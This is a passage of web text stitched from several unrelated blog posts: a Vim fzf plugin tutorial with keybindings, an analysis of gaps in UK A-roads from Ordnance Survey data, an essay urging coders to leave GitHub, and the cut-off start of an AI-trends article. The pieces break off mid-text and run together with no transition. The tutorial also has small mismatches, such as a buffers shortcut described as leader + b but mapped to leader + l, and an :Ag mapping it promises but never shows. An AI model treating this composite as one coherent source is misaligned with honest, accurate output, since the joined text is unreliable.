that up, and you can add the following:</p>
<div data-language="vim"><pre><code>Plug <span>'junegunn/fzf'</span><span>,</span> <span>{</span> <span>'do'</span><span>:</span> <span>{</span> <span>-</span><span>&gt;</span> fzf#<span>install</span><span>(</span><span>)</span> <span>}</span> <span>}</span>
Plug <span>'junegunn/fzf.vim'</span></code></pre></div>
<p>Then, install these plugins with <code>:PlugInstall</code> or use this shortcut I use:</p>
<div data-language="vim"><pre><code>
nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span><span>&lt;</span>leader<span>&gt;</span><span>1</span> <span>:</span><span>source</span> ~<span>/</span><span>.</span>vimrc \| <span>:</span>PlugInstall<span>&lt;</span>CR<span>&gt;</span></code></pre></div>
<p>You can then press your leader key and number 1 to install and apply all the
changes in your <code>.vimrc</code>.</p>
<p>Now, to the coolest part!</p>
<h2 id="the-magic-finder"><a href="#the-magic-finder" aria-label="the magic finder permalink"></a>The magic finder</h2>
<p>Everything we need is installed, and we can get to the practical part. As we
said before, fzf is a fuzzy finder, a file selector if you want. Let’s try
out that feature right off. To get the file picker opened, type <code>:Files</code> in
a Vim session. You should get something like this:</p>
<p><span>
      <span></span>
  <img alt="Open :Files" title="Open :Files" src="https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/fcda8/open-files.png" srcset="https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/12f09/open-files.png 148w,

    </span></p>
<p>What happened is fzf opened a small window at the bottom showing files in our
directory. If you look at the newly opened window, you will see the list of
files, and the <strong>preview</strong> of the currently selected file on the right
of the window. So you got your files on the left and their preview on the
right. Are you already impressed as I was? Cool, let’s move on.</p>
<p>If you don’t like the window, you can fine-tune easily with fzf customization
options. But if you want any fzf command in fullscreen, you can append <code>!</code> at
the end of the command. For example, let’s do <code>:Files!</code> and you should see the
following:</p>
<p><span>
      <span></span>
  <img alt="Open :Files! in fullscreen" title="Open :Files! in fullscreen" src="https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/fcda8/open-files-fullscreen.png" srcset="https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/12f09/open-files-fullscreen.png 148w,

    </span></p>
<p>But, I don’t use <code>:Files</code> that often. As a matter of fact, I only use
<code>:GFiles</code> command by fzf. <code>:GFiles</code> will open a file picker for your Git files,
ignoring ones in the <code>.gitignore</code>. Using it is pretty neat in JavaScript
projects where <code>node_modules</code> files tend to kill the mood when running
<code>:Files</code>. Let us compare the same project with <code>:Files</code> and <code>:GFiles</code> commands:</p>
<p><span>

<p>
  Yuck! `node_modules` everywhere.
</p>
<p><span>
      <span></span>
  <img alt=":GFiles in a JavaScript project" title=":GFiles in a JavaScript project" src="https://pragmaticpineapple.com/static/6cd545cf7ed03bb38decb5c1ae2d9949/fcda8/git-files-js-project.png" srcset="https://pragmaticpineapple.com/static/6cd545cf7ed03bb38decb5c1ae2d9949/12f09/git-files-js-project.png 148w,

    </span></p>
<p>
  Ah, that's better.
</p>
<p>Notice the difference? It feels like I just dropped a heavy backpack off my
back by not having those <code>node_modules/**</code> files popping up. Anyway, let’s see
this bad boy in action when searching for files to edit.</p>
<p><img src="https://pragmaticpineapple.com/5a84a887e91f3aea28f8692bcc518fc0/gfiles-in-action.gif" alt=":GFiles in action GIF"></p>
<p>That’s it, and it is looking pretty good. Only thing I dislike about using <code>:GFiles</code> is
that it won’t include your new files unless you add them to the Git index with
<code>git add</code>. Also, I’d like some syntax highlighting to be there out of the box
when previewing files, but we will cover that in another blog post. In the
meantime, consider subscribing to the <a href="https://pragmaticpineapple.com/improving-vim-workflow-with-fzf/newsletter">newsletter</a> to get similar
posts like this.</p>
<p>To sum up, fzf is useful and quick as a flash when searching for files. And, as
Drake below says, resort to using <code>:GFiles</code> or try to configure <code>:Files</code> to
ignore certain files and paths.</p>
<p><span>
      <span></span>
  <img alt="Drake fzf choices - go with :GFiles instead of :Files" title="Drake fzf choices - go with :GFiles instead of :Files" src="https://pragmaticpineapple.com/static/643d1c18c9fd8e42484fcaffaa4d99eb/41099/drake-no-files-yes-gfiles.jpg" srcset="https://pragmaticpineapple.com/static/643d1c18c9fd8e42484fcaffaa4d99eb/a80bd/drake-no-files-yes-gfiles.jpg 148w,

    </span></p>
<p>To make this super fast for you, you can create a shortcut. I open <code>:GFiles</code>
with CTRL + p. I got left with this in my muscle memory from the legendary
<a href="https://github.com/kien/ctrlp.vim">ctrlp</a> plugin. To have <code>:GFiles</code> wired
up, so it opens with CTRL + p, you can add the following to your <code>.vimrc</code>:</p>
<div data-language="vim"><pre><code>nnoremap <span>&lt;</span>C<span>-</span><span>p</span><span>&gt;</span> <span>:</span>GFiles<span>&lt;</span>Cr<span>&gt;</span></code></pre></div>
<h2 id="speed-search-your-project"><a href="#speed-search-your-project" aria-label="speed search your project permalink"></a>Speed search your project</h2>
<p>What blows my mind from time to time is other things you can do with fzf in
Vim. For example, you can use
<a href="https://github.com/ggreer/the_silver_searcher">The Silver Searcher</a>
or
<a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> with fzf.
To search with The Silver Searcher, type <code>:Ag</code> and a term you want to
search. And, to search with ripgrep, type <code>:Rg</code> and the term. Of course, to
have these commands work, you need the respective libraries installed in your
environment.</p>
<p>I use <code>:Ag</code>, and it performs wonderfully. It is wired to CTRL + g for me,
so I access it quickly. To have this or a similar setup, add the following
to your <code>.vimrc</code>:</p>

<p>The shortcut above will open up the <code>:Ag</code> search windows at the bottom with the
preview of the file. I find it super helpful and quick when I need to search
for a word in a project. Let’s see <code>:Ag</code> in action.</p>
<p><img src="https://pragmaticpineapple.com/0c1dc6a8efd411223955dd76a20783a6/ag-in-action.gif" alt=":Ag in action"></p>
<h2 id="buffed-up"><a href="#buffed-up" aria-label="buffed up permalink"></a>Buffed up</h2>
<p>You can search all your open buffers with fzf by typing <code>:Buffers</code>. I keep a
shortcut at my leader key (the Space key, BTW) + b. Like so:</p>
<div data-language="vim"><pre><code>nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span><span>&lt;</span>leader<span>&gt;</span><span>l</span> <span>:</span>Buffers<span>&lt;</span>CR<span>&gt;</span></code></pre></div>
<p>With that command, you will get a buffers explorer where you can quickly switch
between open files. I hope that helps. Let’s see how it looks:</p>
<p><span>
      <span></span>
  <img alt=":Buffers in action" title=":Buffers in action" src="https://pragmaticpineapple.com/static/cb72ecbb277eb7bb278051d84c0b5f96/fcda8/buffers.png" srcset="https://pragmaticpineapple.com/static/cb72ecbb277eb7bb278051d84c0b5f96/12f09/buffers.png 148w,

<p>If you are a fan of drawing inside the terminal, then you are going to love this one.
Try typing <code>:Commits</code> if you are using the <a href="https://github.com/tpope/vim-fugitive">vim-fugitive</a> plugin.
The plugin by itself is a pretty awesome wrapper around Git, just if you
never want to leave the warmth of your Vim session. Anyways, if you type
<code>:Commits</code> you should get a tree of your project commits like so:</p>

<p>Pretty cool, huh? You can scroll up and down and checkout changes at each
commit. You can even enter the commit you are interested in and check out
changes made there. All of this is possible thanks to the <code>vim-fugitive</code>, so check
it out. A blog post about using Git inside Vim is coming, so be sure to
subscribe to the <a href="https://pragmaticpineapple.com/newsletter">newsletter</a>.</p>
<h2 id="a-quick-summary"><a href="#a-quick-summary" aria-label="a quick summary permalink"></a>A quick summary</h2>
<p>Vim ecosystem has a lot of plugins, and fzf is one great plugin. You can search
for files with <code>:GFiles</code> and <code>:Files</code>. If you want to do a text search, try using
<code>:Ag</code> or <code>:Rg</code>, which use The Silver Searcher and ripgrep, respectively. Tired of
slow switching between open buffers - try out <code>:Buffers</code>. Or, if you want some
nice commit information, do <code>:Commits</code>.</p>

<p>I was driving recently, and realised that I was near a road that appeared to have a large gap.&nbsp; By that I mean: road A joins road B and stops, but some distance further along B there’s a bit more road A.&nbsp; It’s as if A has been chopped into two by B, and the two bits slid apart along B.&nbsp; I could think of another road like that, and wondered how many more there were in the UK.&nbsp; It turns out there’s quite a few.&nbsp; Time for some more data munging leading to some graphs and a map.</p>



<h2>Data</h2>



<p>The data I found was the <a href="https://www.ordnancesurvey.co.uk/business-government/products/open-map-roads">Ordnance Survey Open Roads</a>, which gives data for roads in Great Britain (sorry, no Northern Ireland data).&nbsp; It’s for motorways down to minor roads, in loads of detail.&nbsp; Each junction or time a road changes its name is called a node, and the data describes every node, and every bit of road between every node.&nbsp; The version I downloaded was the XML version, rather than a more exotic format such as an <a href="https://en.wikipedia.org/wiki/Shapefile">ESRI Shapefile</a> or <a href="https://www.geopackage.org/">GeoPackage</a>.&nbsp; This is 52 files (one for every major grid square on an OS map), and just under 7 GB in total.</p>



<p>Each node has a unique id, as does each bit of road (called a road link).&nbsp; Each node has its location and a few other bits of data.&nbsp; Each road link says which two nodes it goes between, whether its fictitious or not(!), what kind of road it is (A road, motorway etc.) and 1 or 2 names.&nbsp; A road link always has a road classification number, which might be A1307, and it might also have a name e.g. Huntingdon Road.</p>



<h2>Processing</h2>



<p>I decided to limit things to just A roads and motorways.&nbsp; Even so, there would be a lot of data, and roads such as the A1 will span many files.&nbsp; So the code needed to process each file only once, building up data in memory as it went.</p>



<p>Each time a road link was read in, it was checked against the data already read in.&nbsp; If the road was a new one, then the road was created with this road link as its only data.&nbsp; If the road was one for which there was already data, the new road link’s node ids (that described its two ends) were checked against the node ids already known for that road.&nbsp; If there were any matches for it, the new road link would be added to that data.&nbsp; If the new road link’s node ids weren’t already known, a new set of node ids was started for the road (so that there were two or more sets for the road).</p>



<p>It’s a bit like a game of dominoes – can a new road link be added to the end of an existing road link, because the numbers on the end match?&nbsp; If yes, the arrangement of dominoes is extended.&nbsp; If no, then an extra arrangement is started (with just one domino) alongside the existing dominoes for the road.&nbsp; It’s a little more complicated than that – there could be two existing separate sets of road links for a road (i.e. that don’t join up) and a new road link forms a bridge between the two sets.&nbsp; This means the two sets need to be merged into one.</p>



<p>At the end of processing, how many sets of road links are there per road?&nbsp; If there are two or more, then there are gaps in the road.</p>



<h2>Messy data, or the trouble with the Dundee ring road</h2>



<p>I ran into a problem that seems to happen with every data processing project I do, which is messy data.&nbsp; An example of this is the A991, which is a ring road around Dundee (I just happened to pick on it at random when debugging, as it was a small example of things being wrong).</p>



<p>To start off, I added some extra debug statements to my code, in the hope that this would show me what was going wrong.&nbsp; Unfortunately this didn’t help much, as it was like trying to understand The Matrix:</p>



<figure><img data-attachment-id="2618" data-permalink="https://randomtechthoughts.blog/debug-the-matrix/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png" data-orig-size="807,837" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="debug-the-matrix" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png?w=289" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png?w=656" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png?w=807" alt="Raw debug info from my program" srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png 807w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png?w=145 145w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png?w=289 289w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png?w=768 768w" sizes="(max-width: 807px) 100vw, 807px"></figure>



<p>I thought that the debug data might actually be helpful enough, just presented poorly.&nbsp; So with only a little bit of massaging I turned it into an input file for <a href="https://graphviz.org/">GraphViz</a>, so it could draw out what road link connected to what.&nbsp; This was a little bit more helpful:</p>



<figure><img data-attachment-id="2619" data-permalink="https://randomtechthoughts.blog/a991-graph/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png" data-orig-size="1237,751" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="a991-graph" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=300" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=656" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=1024" alt="Excerpt from the output of GraphViz for the debug info" srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=1024 1024w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=150 150w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=300 300w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=768 768w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png 1237w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The A991 looks like this on a map (in this case, <a href="https://www.openstreetmap.org/">OpenStreetMap</a>) – it’s the pale orange road.</p>



<figure><img data-attachment-id="2620" data-permalink="https://randomtechthoughts.blog/open-streetmap-a991-big-picture/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png" data-orig-size="965,710" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="open-streetmap-a991-big-picture" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png?w=300" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png?w=656" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png?w=965" alt="A991 as shown on " srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png 965w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png?w=150 150w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png?w=300 300w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png?w=768 768w" sizes="(max-width: 965px) 100vw, 965px"></figure>



<p>I could match the road names (West Marketgait etc.) between the graph and the map, and the junction near Dundee railway station at the bottom of the map was the problem.&nbsp; In the data, there is no joining up of the A991 there.&nbsp; On OpenStreetMap you can ask it for information about each bit of road, so you can see that South Union Street (highlighted in red/orange) is part of the A991:</p>



<figure><img data-attachment-id="2621" data-permalink="https://randomtechthoughts.blog/open-streetmap-a991/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png" data-orig-size="832,543" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="open-streetmap-a991" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png?w=300" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png?w=656" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png?w=832" alt="Excerpt of OpenStreetMap output showing the information about South Union Street, including the fact that it's part of the A991" srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png 832w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png?w=150 150w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png?w=300 300w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png?w=768 768w" sizes="(max-width: 832px) 100vw, 832px"></figure>



<p>This way I could tell that OpenStreetMap also had a gap in the roads tagged as belonging to the A991, although its gap didn’t match up exactly with the gap in the OS data.&nbsp; The bit of the Riverside Esplanade highlighted in red / orange isn’t tagged with A991 (this is from OpenStreetMap), even though the OS data described it as part of the A991.</p>



<figure><img data-attachment-id="2623" data-permalink="https://randomtechthoughts.blog/open-streetmap-not-a991/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png" data-orig-size="995,627" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="open-streetmap-not-a991" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png?w=300" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png?w=656" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png?w=995" alt="Excerpt from OpenStreetMap showing a gap in the A991" srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png 995w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png?w=150 150w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png?w=300 300w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png?w=768 768w" sizes="(max-width: 995px) 100vw, 995px"></figure>



<p>I checked the Ordnance Survey’s own online map to see if that would clear things up, and it didn’t.&nbsp; There’s less information and less helpful colouring than in OpenStreetMap:</p>



<figure><img data-attachment-id="2624" data-permalink="https://randomtechthoughts.blog/osmap/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png" data-orig-size="622,323" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="osmap" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png?w=300" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png?w=622" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png?w=622" alt="Excerpt of OS online map for A991" srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png 622w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png?w=150 150w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png?w=300 300w" sizes="(max-width: 622px) 100vw, 622px"></figure>



<p>Google Maps is different again!&nbsp; (I’ll let you imagine that / look it up for yourself.)</p>



<p>I decided to keep my life simple and just ignore any gaps less than a certain size.&nbsp; The threshold for ignoring gaps is arbitrary, and I wanted to err on the side of caution. &nbsp;That is I’d prefer to miss gaps that were there than treating noise in the data as a gap when it wasn’t one in real life.&nbsp; So I decided to go for a figure of 500m, as the location information was in metres (OS Eastings and Northings), and 500m is the biggest value that would round down to 0 if you round to the nearest kilometre.&nbsp; I know that’s still quite arbitrary, but I had to draw the line somewhere.</p>



<p>I also wanted to make sure that A roads becoming motorways didn’t introduce a gap, as in real life that’s the same road.&nbsp; For instance, the A1 becomes the A1(M) in places.&nbsp; If a road ended in “(M)” I ignored this, to avoid brief spells as a motorway introducing spurious gaps.</p>



<h2>To err is human</h2>



<p>I don’t always go into all the messy details, wrong turns etc. when I blog, because it would take too much time to write, and too much time to read (and so you’d probably lose interest).&nbsp; However, I’ve recently enjoyed watching videos by <a href="https://www.youtube.com/user/tomstanton282">Tom Stanton</a> and <a href="https://www.youtube.com/channel/UCj1VqrHhDte54oLgPG4xpuQ">Stuff Made Here</a>, and part of what makes them enjoyable is that you see the failure and frustration and disappointments, so that success seems properly earned.</p>



<p>It’s worth remembering that this is in the context of physical projects – planes flying or crashing, robots working or not etc. – which is a much more interesting kind of failure than someone writing about debugging software.&nbsp; I don’t want to give the false impression that everything goes swimmingly with this blog, but nor do I want to bore you.&nbsp; So, please imagine these posts are the tip of an iceberg, where the iceberg is mostly frustration and “Why isn’t it working?!”</p>



<h2>Calculating the size of gaps</h2>



<p>As I mentioned above, each road with gaps in had two or more separate sets of road links.&nbsp; I went for a brute force approach, and for a pair of sets A and B, calculate the distance between each node in set A and each node in B.&nbsp; I then took the minimum distance for the pair as the distance between sets A and B.&nbsp; If a road had more than two sets, then it wasn’t obvious which set was closest to which other set, so I extended the brute force approach to try each set with each other set, and say that the distance between a given set and the rest of the road was the minimum distance between that set and all other sets for the road.&nbsp; With all these distances calculated, I then took the biggest distance across all sets for a road to represent the road as a whole.</p>



<h2>Roads with different sizes of gaps</h2>



<p>This chart shows the number of roads that had a maximum gap of a given size, grouping gap sizes into ranges:</p>



<figure><img data-attachment-id="2626" data-permalink="https://randomtechthoughts.blog/gap-range-graph/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png" data-orig-size="682,485" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="gap-range-graph" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png?w=300" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png?w=656" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png?w=682" alt="Chart showing how many roads have gaps of a certain size" srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png 682w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png?w=150 150w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png?w=300 300w" sizes="(max-width: 682px) 100vw, 682px"></figure>



<p>Yes, there are roads that have gaps of over 300 km!  Most gaps are less than 10 km.</p>



<h2>How many sections per road</h2>



<p>I wanted to know how common it was for a road to be split into 2 or more sections (where I ignore gaps of less than 500m).  This table shows how common it is for a road to have a given number of sections.</p>



<figure><table><tbody><tr><td><strong>Number of sections</strong></td><td><strong>Number of roads with this number of sections</strong></td></tr><tr><td>6</td><td>1</td></tr><tr><td>5</td><td>2</td></tr><tr><td>4</td><td>9</td></tr><tr><td>3</td><td>35</td></tr><tr><td>2</td><td>160</td></tr><tr><td>1</td><td>119</td></tr></tbody></table></figure>



<p>This takes a little explaining, partly because this is an instance of <a href="https://randomtechthoughts.blog/2018/10/23/counting-fence-panels-or-fence-posts/">counting fence posts vs. counting fence panels</a>, and partly because of ignoring small gaps.</p>



<p>If a road has 1 gap, it will have 2 sections (in the posts / panels analogy, the gap is the fence panel and the sections are the fence posts).  If a road has 2 gaps, it will have 3 sections etc.</p>



<p>However, imagine that the road has 2 gaps but 1 is below 500 m.  It will have sections A, B and C.  Imagine that the B – C gap is the one below 500 m.  This means that only section A is separated from the rest of the road by a gap we’re counting.  B and C are close enough to another section (the other one in the B / C pair) that their distance from the rest of the road will be below 500 m and we won’t count them.  So a road that is ‘split’ will have only 1 section in the table above.  Without this ignoring of small gaps, the smallest number of sections a split road could have is 2.</p>



<p>The maximum number of sections if you include gaps of any size is 16 (the A38).  Ignoring gaps below 500 m, the roads with the most sections are:</p>



<figure><table><tbody><tr><td><strong>Number of sections</strong></td><td><strong>Roads</strong></td></tr><tr><td>6</td><td>A361</td></tr><tr><td>5</td><td>A6, A422</td></tr><tr><td>4</td><td>A44, A417, A350, A272, A513, A489, A371, A63, A264</td></tr></tbody></table></figure>



<h2>Biggest gaps</h2>



<p>This map shows the ten roads with the biggest gaps.&nbsp; The line shows the gap in the road, i.e. where the road <em>isn’t</em>.&nbsp; There are bits of the road at each end of the line.  Sorry about the labels being hard to read – I suggest that you type the road name into an online map to explore the details of the ends of each gap.</p>

<h2>Summary</h2>



<p>There’s no big point to this post – I was just curious, and followed that curiosity into some data.&nbsp; I don’t know why there are gaps as large as on the map.&nbsp; My guess is that they aren’t actually one road split into two.&nbsp; Instead, there are two unrelated roads that happen to re-use the road number.</p>

The two most popular apprehensions are:</p>
<ul><li><em>"I need it for less.. technical users"</em> (or some variation of thereof)</li><li><em>"I need it for CI"</em> (continuous integration)</li></ul>



<p>There was a time I shared this hopeful belief.
<a href="https://en.wikipedia.org/wiki/Build_it_and_they_will_come">"Build it and they will come"</a> sort of thing.</p>
<p>I was deluding my self and perhaps you are too.
Unless your software is truly useful to many, or already popular through some other means, they will not come, Github or otherwise.</p>
<p>"But everyone has an account there so, it will be one step away".
A mostly-imaginary threshold.
It's in your head.
Think about it.. those with skills &amp; time, who can wholesomely contribute, will highly likely to already have email and perhaps <a href="https://xmpp.org/">XMPP</a> (<a href="https://movim.eu/">Movim</a>) or <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat">IRC</a>.
It is not the facilities stopping them, it's either skill or will to dedicate time.</p>
<p>"Yeah, but Github's interface is just easier and has issue-tracking and ..".
Again, mostly-imaginary threshold.
If one wishes to participate in a project, <em>really</em>, <strong>truly</strong>, wishing to participate, the buttons will not be a barrier.
In fact, from my brief time on Github and Gitlab, all I can attribute to the glossy interfaces was the drive-by comments, without any follow-through or interaction.
So it's a good filter rather than a bad barrier.</p>


<p>This is not the answer you are looking for.
I never bought into this and still stand by it.</p>
<p>Is your build complicated beyond what you can cope with?
Your tools taking longer than you can bare waiting for?</p>
<p>What does it say about our skills &amp; tools when the solution we gravitate towards is a commercial behemoth providing more automation, wattage &amp; time than we have at home?</p>
<p>How is it open when our dependency to this service seems to increase without any programmer being able to resist it?</p>
<p>And what about the environmental impact of continuously running these processes?</p>
<p>This is not a solution.
It is a harmful distraction, digression &amp; deferment both from writing good &amp; efficient code and migrating to a more nimble solution by upping our game.</p>


<p>Github (Gitlab too) have become the Facebook-Twitter of coders.
Merchants of "sweet approval", intermediaries we designated when we became desperate for the attention of others online.</p>
<p>Our insatiable desire for commentary, 'stars' &amp; pull-requests has gifted that enterprise an immense gravity.
While we are hooked on their mesmerising gimmicks, students are taught Github's interface instead of <code>git</code> commands and are expected to have an account with them if they are to register on the corporate map when searching for a job.</p>
<p>Worse still, we may have lost our soul.
Would we write code if no one was watching? For the enjoyment of the practice itself?
Those answering <em>yes</em>, fear not, you don't need them!</p>
<p>Move on, there is still a community out there, where you stand a better chance of (literally) unscripted interaction.
Our open source code, has propped their dominance for too long.
It's time to take it back!</p>

                        <p>Artificial intelligence and its subdomain Machine Learning (ML) have been showing promising trends over the past few years. At one side, AI is transforming the way of living and human interactions almost in every industry at large scale. On the other side the restrictions and polices imposed during COVID-19 pandemic has turned out to be an advantage for AI to grow. Given the lockdown situation and businesses turning towards digital transformation, AI has emerged as only futuristic technology that is not only solving and automating manual business workflows but also helping in <a href="https://thinkml.ai/top-5-cost-cutting-artificial-intelligence-ai-use-cases-in-banking-and-finance/">reducing the cost</a>. Year 2020 has witnessed many unique platforms, researches and tools that utilize AI to great extent, but year 2021 has promised much more and quite rightly called as the <strong>golden year</strong> for AI implementation.</p><p>Read also: <a href="https://thinkml.ai/top-10-ai-trends-to-watch-in-2020/">Top AI trends for year 2020</a></p><p>The global AI market size was calculated as $39.9 Billion in 2019 and expected to achieve <a href="https://www.grandviewresearch.com/industry-analysis/artificial-intelligence-ai-market">compound annual growth rate</a> (<strong>CAGR</strong>) up to 42.2% from 2020 to 2027. Technology has made innovations in big fields like healthcare, retail, automobile, and finance with continuous research. AI is one significant element that is promising to dominate and transform the digital era entirely with high accuracy and precision.</p><p>In this article, we have come up with <strong>Top 10 Artificial 